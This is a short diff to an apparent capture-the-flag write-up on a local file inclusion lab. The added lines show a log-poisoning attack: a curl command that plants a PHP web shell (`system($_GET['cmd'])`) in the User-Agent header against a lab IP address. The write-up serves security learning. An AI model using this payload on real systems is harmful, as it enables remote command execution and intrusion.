@@ -1023,5 +1023,8 @@ So I tried:
 Lets try:
 `%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`
 
-That didn't work
+That didn't work. However trying again but modifying the user agent does:
+`curl 'http://83.136.255.43:36946/ilf_admin/index.php?log=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E' -A '<?php system($_GET['cmd']); ?>'`
+
+Now all I need to do is get the flag.
 
